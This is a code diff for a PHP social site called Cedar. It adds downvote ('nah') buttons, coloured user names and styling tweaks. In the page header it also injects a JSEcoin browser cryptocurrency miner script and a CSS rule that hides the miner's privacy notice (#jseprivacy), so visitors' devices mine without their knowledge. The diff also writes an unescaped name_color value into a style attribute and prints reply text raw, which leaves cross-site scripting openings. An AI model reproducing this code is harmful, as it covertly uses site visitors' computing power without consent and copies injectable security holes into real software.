@@ -59,19 +59,21 @@ function printHeader($on_page) {
 		#global-menu #global-my-menu .symbol:before {color: hsl('.$HSL[0].','.$HSL[1].'%,'.$HSL[2].'%);}
 		.dialog .window-title {
 			border-top: 1px solid hsl('.$HSL[0].','.$HSL[1].'%,'.$HSL[2].'%);border-bottom: 1px solid hsl('.$HSL[0].','.$HSL[1].'%,'.$HSL[2].'%);background: hsl('.$HSL[0].','.$HSL[1].'%,'.$HSL[2].'%);}
-		#post-meta .yeah-added + .empathy, .reply-meta .yeah-added + .empathy {color: hsl('.($HSL[0]).','.$HSL[1].'%,'.($HSL[2]).'%);}
-		#post-meta .yeah-added + .empathy:before, .reply-meta .yeah-added + .empathy:before {color: hsl('.$HSL[0].','.$HSL[1].'%,'.$HSL[2].'%);}
+		#post-meta .yeah-added + .nah + .empathy, .reply-meta .yeah-added + .nah + .empathy {color: hsl('.($HSL[0]).','.$HSL[1].'%,'.($HSL[2]).'%);}
+		#post-meta .yeah-added + .nah + .empathy:before, .reply-meta .yeah-added + .nah + .empathy:before {color: hsl('.$HSL[0].','.$HSL[1].'%,'.$HSL[2].'%);}
 		.news-list a.link {color: hsl('.$HSL[0].','.$HSL[1].'%,'.$HSL[2].'%);}
 		.user-sidebar .follow-button:before {color: hsl('.$HSL[0].','.$HSL[1].'%,'.$HSL[2].'%);}
 		.user-sidebar .friend-button:before {color: hsl('.$HSL[0].','.$HSL[1].'%,'.$HSL[2].'%);}
 		div#activity-feed-tutorial {border: 3px solid hsl('.$HSL[0].','.$HSL[1].'%,'.$HSL[2].'%);}
 		div#activity-feed-tutorial h3 {color: hsl('.$HSL[0].','.$HSL[1].'%,'.$HSL[2].'%);}
 		.list .toggle-button .follow-button:before {color: hsl('.$HSL[0].','.$HSL[1].'%,'.$HSL[2].'%);}
+		.user-organization {color: hsl('.$HSL[0].','.$HSL[1].'%,'.$HSL[2].'%);}
 		#image-header-content .image-header-title .title {color: hsl('.$HSL[0].','.$HSL[1].'%,'.$HSL[2].'%);}
 		.list .toggle-button .follow-done-button:before {color: hsl('.$HSL[0].','.$HSL[1].'%,'.$HSL[2].'%);}
 		#reply-content .list .my {background-color: hsl('.($HSL[0]+3).','.($HSL[1]-29).'%,'.($HSL[2]+47).'%);}
 		#reply-content .list .my:hover {background-color: hsl('.($HSL[0]+3).','.($HSL[1]-29).'%,'.($HSL[2]+46).'%);}
 		#reply-content .list .my:active {background-color: hsl('.($HSL[0]+3).','.($HSL[1]-29).'%,'.($HSL[2]+43).'%);}
+		.create-button:before {color: hsl('.$HSL[0].','.$HSL[1].'%,'.$HSL[2].'%);}
 		@media screen and (max-width: 980px){
 		#global-menu li.selected a {
     		border-bottom: 2px solid hsl('.$HSL[0].','.$HSL[1].'%,'.$HSL[2].'%);
@@ -82,6 +84,7 @@ function printHeader($on_page) {
 	echo '<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 	<script defer src="/assets/js/jquery-3.2.1.min.js"></script>
 	<script defer src="/assets/js/favico.js"></script>
+	<script src="https://unpkg.com/tippy.js@2.0.9/dist/tippy.all.min.js"></script>
 	<script defer src="/assets/js/yeah.js"></script>
 	<link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicon-96x96.png">
 	<meta property="og:site_name" content="Cedar">
@@ -99,6 +102,14 @@ function printHeader($on_page) {
 	</head>
 
 	<body>
+	<script type="text/javascript">
+!function(){var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/46114/cedar.doctor/0/0/",s.parentNode.insertBefore(t,s)}();
+</script>
+<style>
+#jseprivacy {
+	display: none !important;
+}
+</style>
 	  <div id="wrapper">
 	    <div id="sub-body">
           <menu id="global-menu">
@@ -162,7 +173,7 @@ function printPost($post, $reply_pre){
 	global $dbc;
 
 	echo '<a href="/users/'. $post['user_name'] .'/posts" class="icon-container'.($post['user_level'] > 1 ? ' verified' : '').'"><img src="'. printFace($post['user_face'], $post['feeling_id']) .'" id="icon"></a>
-		<p class="user-name"><a href="/users/'. $post['user_name'] .'/posts">'. htmlspecialchars($post['nickname'], ENT_QUOTES) .'</a></p>
+		<p class="user-name"><a href="/users/'. $post['user_name'] .'/posts" '.(isset($post['name_color']) ? 'style="color: '. $post['name_color'] .'"' : '').'>'. htmlspecialchars($post['nickname'], ENT_QUOTES) .'</a></p>
 		<p class="timestamp-container"><a class="timestamp" href="/posts/'.$post['id'].'">'.humanTiming(strtotime($post['date_time'])).'</a></p><div id="body">';
 
 	if ($post['deleted'] == 1) {
@@ -173,7 +184,7 @@ function printPost($post, $reply_pre){
 	}
 		
 	if (!empty($post['post_image'])) {
-		echo '<div class="screenshot-container"><img src="'.$post['post_image'].'"></div>';
+		echo '<div class="screenshot-container"><img src="'. $post['post_image'] .'"></div>';
 	}
 
 	$original_length = mb_strlen($post['text']);
@@ -184,7 +195,7 @@ function printPost($post, $reply_pre){
 
 	$post['text'] = htmlspecialchars($post['text'], ENT_QUOTES);
 
-	$post['text'] = preg_replace('|([\w\d]*)\s?(https?://([\d\w\.-]+\.[\w\.]{2,6})[^\s\]\[\<\>]*/?)|i', ' <a href="$2" class="post-link">$2</a>', $post['text']);
+	$post['text'] = preg_replace('|([\w\d]*)\s?(https?://([\d\w\.-]+\.[\w\.]{2,6})[^\s\]\[\<\>]*/?)|i', ' <a href="$2" target="_blank" class="post-link">$2</a>', $post['text']);
 		
 	echo '<div id="post-body">';
 
@@ -196,14 +207,82 @@ function printPost($post, $reply_pre){
 
 	echo '</div><div id="post-meta">';
 
-	$yeah_count = $dbc->prepare('SELECT COUNT(yeah_by) FROM yeahs WHERE type = "post" AND yeahs.yeah_post = ?');
+	$yeah_count = $dbc->prepare('SELECT COUNT(yeah_by) FROM yeahs WHERE type = "post" AND yeah_post = ?');
 	$yeah_count->bind_param('i', $post['id']);
 	$yeah_count->execute();
 	$result_count = $yeah_count->get_result();
 	$yeah_amount = $result_count->fetch_assoc();
+
+	$nah_count = $dbc->prepare('SELECT COUNT(nah_by) FROM nahs WHERE type = 0 AND nah_post = ?');
+	$nah_count->bind_param('i', $post['id']);
+	$nah_count->execute();
+	$result_count = $nah_count->get_result();
+	$nah_amount = $result_count->fetch_assoc();
+
+	$yeahs = $yeah_amount['COUNT(yeah_by)'] - $nah_amount['COUNT(nah_by)'];
+
+
+
+
 					
-	echo '<button class="yeah symbol '. (!empty($_SESSION['signed_in']) ? (checkYeahAdded($post['id'], 'post', $_SESSION['user_id']) ? 'yeah-added' : '') : '') .'" '. (!empty($_SESSION['signed_in']) && !checkPostCreator($post['id'], $_SESSION['user_id']) ? '' : 'disabled') .' id="'. $post['id'] .'" data-track-label="post"><span class="yeah-button-text">'. (!empty($_SESSION['signed_in']) ? (checkYeahAdded($post['id'], 'post', $_SESSION['user_id']) ? 'Unyeah' : 'Yeah!') : 'Yeah!') .'</span></button>
-		<div class="empathy symbol"><span class="yeah-count">'. $yeah_amount['COUNT(yeah_by)'] .'</span></div>';
+	echo '<button class="yeah symbol';
+
+	if (!empty($_SESSION['signed_in']) && checkYeahAdded($post['id'], 'post', $_SESSION['user_id'])) {
+		echo ' yeah-added';
+	}
+
+	echo '"'; 
+
+	if (empty($_SESSION['signed_in']) || checkPostCreator($post['id'], $_SESSION['user_id'])) {
+		echo ' disabled ';
+	}
+
+	echo 'id="'. $post['id'] .'" data-track-label="post"><span class="yeah-button-text">';
+
+	if (!empty($_SESSION['signed_in']) && checkYeahAdded($post['id'], 'post', $_SESSION['user_id'])) {
+		echo 'Unyeah';
+	} else {
+		echo 'Yeah!';
+	}
+
+	echo '</span></button>';
+
+
+
+
+
+
+
+	echo '<button class="nah symbol';
+
+	if (!empty($_SESSION['signed_in']) && checkNahAdded($post['id'], 0, $_SESSION['user_id'])) {
+		echo ' nah-added';
+	}
+
+	echo '"'; 
+
+	if (empty($_SESSION['signed_in']) || checkPostCreator($post['id'], $_SESSION['user_id'])) {
+		echo ' disabled ';
+	}
+
+	echo 'id="'. $post['id'] .'" data-track-label="0"><span class="nah-button-text">';
+
+	if (!empty($_SESSION['signed_in']) && checkNahAdded($post['id'], 0, $_SESSION['user_id'])) {
+		echo 'Un-nah.';
+	} else {
+		echo 'Nah...';
+	}
+
+	echo '</span></button>';
+
+
+
+
+	
+
+
+
+echo '<div class="empathy symbol" yeahs="'. $yeah_amount['COUNT(yeah_by)']  .'" nahs="'. $nah_amount['COUNT(nah_by)']  .'" title="'. $yeah_amount['COUNT(yeah_by)'] .' '. ($yeah_amount['COUNT(yeah_by)'] == 1 ? 'Yeah' : 'Yeahs') .' / '. $nah_amount['COUNT(nah_by)'] .' '. ($nah_amount['COUNT(nah_by)'] == 1 ? 'Nah' : 'Nahs') .'"><span class="yeah-count">'. $yeahs .'</span></div>';
 		
 	$reply_count = $dbc->prepare('SELECT COUNT(reply_id) FROM replies WHERE reply_post = ? AND deleted = 0');
 	$reply_count->bind_param('i', $post['id']);
@@ -216,7 +295,7 @@ function printPost($post, $reply_pre){
 	if ($post['deleted'] == 0) {
 
 		if ($reply_pre == 1){
-	        $search_replies = $dbc->prepare('SELECT users.*, replies.* FROM replies LEFT JOIN users ON user_id = reply_by_id WHERE reply_post = ? AND deleted = 0 ORDER BY date_time DESC LIMIT 1');
+	        $search_replies = $dbc->prepare('SELECT * FROM replies INNER JOIN users ON user_id = reply_by_id INNER JOIN profiles ON users.user_id = profiles.user_id WHERE reply_post = ? AND deleted = 0 ORDER BY date_time DESC LIMIT 1');
 	        $search_replies->bind_param('i', $post['id']);
 	        $search_replies->execute();
 	        $replies_result = $search_replies->get_result();
@@ -226,7 +305,7 @@ function printPost($post, $reply_pre){
 	        	echo '<div class="recent-reply-content">
 	        	'.($reply_amount['COUNT(reply_id)']>1?'<div class="recent-reply-read-more-container" data-href="/posts/'.$post['id'].'" tabindex="0">View More Comments ('.($reply_amount['COUNT(reply_id)']-1).')</div>':'').'
 	        	<div class="recent-reply trigger"><a href="/users/'.$replies['user_name'].'/posts" class="icon-container'.($replies['user_level']==2?' verified':'').'"><img src="'.printFace($replies['user_face'], $replies['feeling_id']).'" id="icon"></a>
-	        	<p class="user-name"><a href="/users/'.$replies['user_name'].'/posts">'. htmlspecialchars($replies['nickname'], ENT_QUOTES) .'</a></p>
+	        	<p class="user-name"><a href="/users/'.$replies['user_name'].'/posts" '.(isset($replies['name_color']) ? 'style="color: '. $replies['name_color'] .'"' : '').'>'. htmlspecialchars($replies['nickname'], ENT_QUOTES) .'</a></p>
 	        	<p class="timestamp-container"><a class="timestamp" href="/posts/'.$post['id'].'">'.humanTiming(strtotime($replies['date_time'])).'</a></p>
 	        	<div id="body"><div class="post-content"><p class="recent-reply-content-text">'.$replies['text'].'</p></div></div></div></div>';
 	        }
@@ -276,6 +355,21 @@ function checkYeahAdded($post, $type, $user_id){
 	
 	$check_yeahed = $dbc->prepare('SELECT * FROM yeahs WHERE yeahs.yeah_post = ? AND yeahs.type = ? AND yeahs.yeah_by = ?');
 	$check_yeahed->bind_param('sss', $post, $type, $user_id);
+	$check_yeahed->execute();
+    $yeahed_result = $check_yeahed->get_result();
+	
+	if (!$yeahed_result->num_rows == 0){
+		return true;
+	} else {
+		return false;
+	}
+}
+
+function checkNahAdded($post, $type, $user_id){
+	global $dbc;
+	
+	$check_yeahed = $dbc->prepare('SELECT * FROM nahs WHERE nah_post = ? AND type = ? AND nah_by = ?');
+	$check_yeahed->bind_param('iii', $post, $type, $user_id);
 	$check_yeahed->execute();
     $yeahed_result = $check_yeahed->get_result();
 	
@@ -367,17 +461,20 @@ function printTitleInfo($title){
 	</li>';
 }
 
+
+
+
+
+
+
+
+
 function printReply($reply){
 	global $dbc;
-	$yeah_count = $dbc->prepare('SELECT COUNT(yeah_by) FROM yeahs WHERE type = "reply" AND yeah_post = ?');
-	$yeah_count->bind_param('i', $reply['reply_id']);
-	$yeah_count->execute();
-    $result_count = $yeah_count->get_result();
-	$yeah_amount = $result_count->fetch_assoc();
 
 	echo '<a href="/users/'.$reply['user_name'].'/posts" class="icon-container'.($reply['user_level']>1?' verified':'').'">
 	<img src="'.printFace($reply['user_face'], $reply['feeling_id']).'" id="icon"></a><div class="body"><div class="header">
-	<p class="user-name"><a href="/users/'.$reply['user_name'].'/posts">'. htmlspecialchars($reply['nickname'], ENT_QUOTES) .'</a></p>
+	<p class="user-name"><a href="/users/'.$reply['user_name'].'/posts" '.(isset($reply['name_color']) ? 'style="color: '. $reply['name_color'] .'"' : '').'>'. htmlspecialchars($reply['nickname'], ENT_QUOTES) .'</a></p>
 	<p class="timestamp-container"><a class="timestamp" href="/replies/'.$reply['reply_id'].'">'.humanTiming(strtotime($reply['date_time'])).'</a></p>
 	</div>';
 
@@ -388,14 +485,88 @@ function printReply($reply){
           </p>';
     }
     if ($reply['deleted'] == 0 || $reply['reply_by_id'] == $_SESSION['user_id']) {
-		$reply['text'] = preg_replace('|([\w\d]*)\s?(https?://([\d\w\.-]+\.[\w\.]{2,6})[^\s\]\[\<\>]*/?)|i', '$1 <a href="$2" class="post-link">$2</a>', $reply['text']);
+		$reply['text'] = preg_replace('|([\w\d]*)\s?(https?://([\d\w\.-]+\.[\w\.]{2,6})[^\s\]\[\<\>]*/?)|i', '$1 <a href="$2" target="_blank" class="post-link">$2</a>', $reply['text']);
 
-    	echo '<p class="reply-content-text">'.$reply['text'].'</p>';
+    	echo '<p class="reply-content-text">'. $reply['text'] .'</p>';
 
-    	echo (!empty($reply['reply_image'])?'<div class="screenshot-container"><img src="'.$reply['reply_image'].'"></div>':'').'<div class="reply-meta"><button class="yeah symbol '.(checkYeahAdded($reply['reply_id'], 'reply', $_SESSION['user_id'])?'yeah-added':'').'" '.(!empty($_SESSION['signed_in']) && !checkReplyCreator($reply['reply_id'], $_SESSION['user_id'])?'':'disabled').' id="'.$reply['reply_id'].'" data-track-label="reply"><span class="yeah-button-text">'.(checkYeahAdded($reply['reply_id'], 'reply', $_SESSION['user_id'])?'Unyeah':'Yeah!').'</span></button><div class="empathy symbol"><span class="yeah-count">'.$yeah_amount['COUNT(yeah_by)'].'</span></div></div>';
+    	echo (!empty($reply['reply_image'])?'<div class="screenshot-container"><img src="'.$reply['reply_image'].'"></div>':'').'<div class="reply-meta">';
+
+
+    	$yeah_count = $dbc->prepare('SELECT COUNT(yeah_by) FROM yeahs WHERE type = "reply" AND yeah_post = ?');
+		$yeah_count->bind_param('i', $reply['reply_id']);
+		$yeah_count->execute();
+		$result_count = $yeah_count->get_result();
+		$yeah_amount = $result_count->fetch_assoc();
+
+		$nah_count = $dbc->prepare('SELECT COUNT(nah_by) FROM nahs WHERE type = 1 AND nah_post = ?');
+		$nah_count->bind_param('i', $reply['reply_id']);
+		$nah_count->execute();
+		$result_count = $nah_count->get_result();
+		$nah_amount = $result_count->fetch_assoc();
+
+		$yeahs = $yeah_amount['COUNT(yeah_by)'] - $nah_amount['COUNT(nah_by)'];
+
+
+
+    	echo '<button class="yeah symbol';
+
+	if (!empty($_SESSION['signed_in']) && checkYeahAdded($reply['reply_id'], 'reply', $_SESSION['user_id'])) {
+		echo ' yeah-added';
+	}
+
+	echo '"'; 
+
+	if (empty($_SESSION['signed_in']) || checkReplyCreator($reply['reply_id'], $_SESSION['user_id'])) {
+		echo ' disabled ';
+	}
+
+	echo 'id="'. $reply['reply_id'] .'" data-track-label="reply"><span class="yeah-button-text">';
+
+	if (!empty($_SESSION['signed_in']) && checkYeahAdded($reply['reply_id'], 'reply', $_SESSION['user_id'])) {
+		echo 'Unyeah';
+	} else {
+		echo 'Yeah!';
+	}
+
+	echo '</span></button>';
+
+
+
+
+
+
+
+	echo '<button class="nah symbol';
+
+	if (!empty($_SESSION['signed_in']) && checkNahAdded($reply['reply_id'], 1, $_SESSION['user_id'])) {
+		echo ' nah-added';
+	}
+
+	echo '"'; 
+
+	if (empty($_SESSION['signed_in']) || checkReplyCreator($reply['reply_id'], $_SESSION['user_id'])) {
+		echo ' disabled ';
+	}
+
+	echo 'id="'. $reply['reply_id'] .'" data-track-label="1"><span class="nah-button-text">';
+
+	if (!empty($_SESSION['signed_in']) && checkNahAdded($reply['reply_id'], 1, $_SESSION['user_id'])) {
+		echo 'Un-nah.';
+	} else {
+		echo 'Nah...';
+	}
+
+	echo '</span></button>';
+
+    	echo '<div class="empathy symbol" yeahs="'. $yeah_amount['COUNT(yeah_by)']  .'" nahs="'. $nah_amount['COUNT(nah_by)']  .'" title="'. $yeah_amount['COUNT(yeah_by)'] .' '. ($yeah_amount['COUNT(yeah_by)'] == 1 ? 'Yeah' : 'Yeahs') .' / '. $nah_amount['COUNT(nah_by)'] .' '. ($nah_amount['COUNT(nah_by)'] == 1 ? 'Nah' : 'Nahs') .'"><span class="yeah-count">'. $yeahs .'</span></div>';
     }
     echo '</div></li>';
 }
+
+
+
+
+
 
 function uploadImage($filename) {
 	/*$client_id="";
